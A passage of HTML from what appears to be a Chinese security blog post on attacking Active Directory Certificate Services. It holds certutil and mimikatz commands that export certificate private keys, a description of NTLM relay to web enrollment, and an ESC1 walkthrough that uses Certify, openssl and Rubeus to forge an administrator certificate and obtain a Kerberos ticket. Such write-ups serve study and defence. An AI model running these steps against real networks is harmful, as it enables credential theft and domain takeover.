+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#查看用户证书  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-user</span> <span class="n">-store</span> <span class="n">My</span>  
+</span></span><span class="line"><span class="cl"><span class="c">#查看机器证书  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-store</span> <span class="n">My</span>  
+</span></span><span class="line"><span class="cl"><span class="c">#导出用户证书  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-user</span> <span class="n">-store</span> <span class="n">My</span> <span class="n">证书的hash</span> <span class="n">C:</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="py">cer</span>  
+</span></span><span class="line"><span class="cl"><span class="c">#导出包含公私钥的用户证书，会要求输入密码  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-user</span> <span class="n">-exportPFX</span> <span class="n">证书的hash</span> <span class="n">C:</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="py">pfx</span>  
+</span></span><span class="line"><span class="cl"><span class="c">#导出机器证书  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-store</span> <span class="n">My</span> <span class="n">证书的hash</span> <span class="n">C:</span><span class="p">\</span><span class="n">machine</span><span class="p">.</span><span class="py">cer</span>  
+</span></span><span class="line"><span class="cl"><span class="c">#导出包含公私钥的机器证书，会要求输入密码  </span>
+</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-exportPFX</span> <span class="n">证书的hash</span> <span class="n">C:</span><span class="p">\</span><span class="n">machine</span><span class="p">.</span><span class="py">pfx</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>有些证书不允许包含公私钥的证书，需要用到<code>mimikatz</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="o">.</span><span class="n">exe</span>  
+</span></span><span class="line"><span class="cl"><span class="n">crypto</span><span class="p">::</span><span class="n">capi</span>  
+</span></span><span class="line"><span class="cl"><span class="n">crypto</span><span class="p">::</span><span class="n">certificates</span> <span class="o">/</span><span class="n">systemstore</span><span class="p">:</span><span class="n">local_machine</span> <span class="o">/</span><span class="n">store</span><span class="p">:</span><span class="n">my</span> <span class="o">/</span><span class="k">export</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="adcs的安全问题" class="heading-element"><span>ADCS的安全问题</span>
+  <a href="#adcs%e7%9a%84%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="web证书注册接口ntlm-relay攻击" class="heading-element"><span>Web证书注册接口NTLM Relay攻击</span>
+  <a href="#web%e8%af%81%e4%b9%a6%e6%b3%a8%e5%86%8c%e6%8e%a5%e5%8f%a3ntlm-relay%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="漏洞原理" class="heading-element"><span>漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>该漏洞产生的主要原因是ADCS支持Web注册，也就是ADCS服务在安装的时候勾选了&quot;证书颁发机构Web注册&quot;选项，导致用户可以通过Web来申请注册证书。而Web接口默认只允许NTLM身份认证。<br>
+由于HTTP类型的NTLM流量默认是不签名的，因此造成了NTLM Relay攻击。攻击者可以利用Print Spooler漏洞或Petitpotam漏洞触发目标机器SMB类型的NTLM流量回连攻击机器，然后再将这个SMB类型的NTLM流量中继给Web注册接口以目标机器权限申请一个证书。攻击者拿到该证书后就可以以目标机器权限进行Kerberos身份验证了。</p>
+<h3 id="证书模版错误攻击" class="heading-element"><span>证书模版错误攻击</span>
+  <a href="#%e8%af%81%e4%b9%a6%e6%a8%a1%e7%89%88%e9%94%99%e8%af%af%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="esc1" class="heading-element"><span>ESC1</span>
+  <a href="#esc1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>颁发CA授予低权限用户请求权限(默认)</li>
+<li>模版中CA管理员审批未启用(默认)</li>
+<li>模版中不需要授权的签名(默认)</li>
+<li>模版允许低权限用户注册</li>
+<li>模版定义了启用认证的EKU</li>
+<li>证书模版允许请求者在CSR中指定一个SAN<br>
+当满足上述条件时，攻击者在请求证书时可以通过<br>
+<code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code>字段来声明自己的身份，从而获取到伪造身份的证书。<br>
+可以使用<code>certify.exe</code>来查看我们配置，发现<code>msPKI-Sertificate-Name-Flag</code>的属性值为<code>ENROLLEE_SUPPLIES_SUBJECT</code>，也就是可以指定使用者身份。<br>
+可以利用此模版来申请一个证书。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certify.exe request /ca:CA-Server.com /template:ECSC1 /altname:administrator  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>把密钥复制出来，保存在<code>ESC1.pem</code>，然后利用<code>openssl</code>来转换成<code>pfx1</code>。</p>
+<ul>
+<li>key后缀，只包含私钥</li>
+<li>crt/cer后缀，只包含公钥</li>
+<li>csr后缀，证书申请文件，不包含公私钥。</li>
+<li>pfx/pem/p12后缀，包含公私钥</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">ESC1</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">&#34;Microsoft Enhanced CryptoGraphic Provider v1.0&#34;</span> <span class="o">--</span><span class="k">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">ESC1</span><span class="o">.</span><span class="n">pfx</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用<code>Rubeus.exe</code>来申请所需要的<code>TGT</code>，此处的<code>ESC1.pfx</code>就是我们刚刚申请的证书。<br>
+<code>Rubeus.exe asktgt /user:administrator /certificate:ESC1.pfx /dc:1.1.1.1 /ptt</code></p>
+<h2 id="reference" class="heading-element"><span>Reference</span>
+  <a href="#reference" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://tttang.com/archive/1593/"target="_blank" rel="external nofollow noopener noreferrer">https://tttang.com/archive/1593/</a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-05-07 19:22:50">Updated on 2025-05-07&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/adcs%E6%94%BB%E5%87%BB/" data-title="ADCS攻击"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/adcs/" class="post-tag" title="Tags - ADCS">ADCS</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="post-nav-item" rel="prev" title="委派攻击"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>委派攻击</a><a href="/jndi%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/" class="post-nav-item" rel="next" title="JNDI学习记录(1)">JNDI学习记录(1)<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
